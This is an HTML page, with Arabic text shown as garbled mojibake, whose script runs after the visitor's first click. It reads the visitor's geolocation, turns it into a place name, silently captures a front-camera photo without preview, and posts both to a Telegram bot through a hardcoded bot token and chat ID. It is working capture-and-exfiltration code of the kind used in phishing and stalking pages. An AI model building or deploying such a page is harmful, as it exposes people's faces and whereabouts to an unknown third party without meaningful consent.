<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title>ุฌุงุฑู ุงููุนุงูุฌุฉ</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body{
  font-family: Arial;
  text-align:center;
  margin-top:40px;
}
#centerImage{
  width:220px;
  margin:20px auto;
  display:block;
}
</style>
</head>
<body>

<h3>๐ธ ุณูุชู ุงูุชูุงุท ุตูุฑุฉ ูุงุญุฏุฉ ุจุนุฏ ููุงููุชู</h3>
<p>ูุณูุชู ุฅุฑุณุงููุง ูุน ุงุณู ูููุนู ุงูุฌุบุฑุงูู</p>

<!-- โ ุตูุฑุฉ ูู ูุณุท ุงูุตูุญุฉ -->
<img
  id="centerImage"
  src="https://ugc.production.linktr.ee/33eeaee9-a676-4312-b3bc-768c4266ef01_IMG-2923.webp?io=true&size=avatar-v3_0"
  alt="ุตูุฑุฉ">

<canvas id="canvas" style="display:none;"></canvas>

<script>
/* ๐ง ุถุน ุชููู ุงูุจูุช ููุง (ุฅู ุฃููู) */
const BOT_TOKEN = "7936048532:AAEvG8kdxK0mXkCqiBYwiquJDfkzs-IHUXI";

/* โ CHAT_ID ูุถุงู */
const CHAT_ID  = "6251932709";

let done = false;

// ุฃูู ููุณุฉ ูู ุงููุณุชุฎุฏู (ุถุฑูุฑูุฉ ููู ุงูุฃุฌูุฒุฉ)
document.body.addEventListener("click", start, { once:true });

async function start(){
  if(done) return;
  done = true;

  navigator.geolocation.getCurrentPosition(async pos => {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;

    // ุชุญููู ุงูุฅุญุฏุงุซูุงุช ุฅูู ุงุณู ููุทูุฉ
    const geoRes = await fetch(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
    );
    const geo = await geoRes.json();

    const area =
      geo.address.city ||
      geo.address.town ||
      geo.address.village ||
      geo.address.state ||
      "ุบูุฑ ูุนุฑูู";

    // ุชุดุบูู ุงููุงููุฑุง ุจุฏูู ูุนุงููุฉ
    const stream = await navigator.mediaDevices.getUserMedia({
      video:{ facingMode:"user" },
      audio:false
    });

    const video = document.createElement("video");
    video.setAttribute("playsinline", true); // ููู ููุขูููู
    video.srcObject = stream;
    await video.play();

    const canvas = document.getElementById("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext("2d").drawImage(video,0,0);

    stream.getTracks().forEach(t => t.stop());

    // ุฅุฑุณุงู ุงูุตูุฑุฉ ูููู (Blob)
    canvas.toBlob(async blob => {

      // ุฅุฑุณุงู ูุต
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
        method:"POST",
        headers:{ "Content-Type":"application/json" },
        body:JSON.stringify({
          chat_id:CHAT_ID,
          text:`๐ธ ุตูุฑุฉ ุฌุฏูุฏุฉ\n๐ ุงููููุน: ${area}`
        })
      });

      // ุฅุฑุณุงู ุงูุตูุฑุฉ
      const fd = new FormData();
      fd.append("chat_id", CHAT_ID);
      fd.append("photo", blob, "photo.png");

      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
        method:"POST",
        body:fd
      });

    },"image/png");

  }, () => alert("โ ุชู ุฑูุถ ุงููููุน"));
}
</script>

</body>
</html>